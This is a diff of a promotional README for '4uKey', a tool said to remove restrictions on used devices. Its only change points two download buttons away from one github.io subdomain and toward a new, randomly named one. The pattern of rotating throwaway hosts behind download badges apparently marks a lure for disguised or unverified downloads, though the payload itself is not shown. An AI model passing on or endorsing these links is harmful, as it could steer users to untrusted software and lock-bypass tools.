@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://somovskoye.github.io/.github/fourUKey">
+  <a href="https://skalsd-oasd.github.io/.github/fourUKey">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download 4uKey"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The used device restriction removal use case has grown in relevance as the used 
 
 <p align="center">
 
-[![Get it Now 4uKey](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/fourUKey)
+[![Get it Now 4uKey](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/fourUKey)
 
 </p>
 
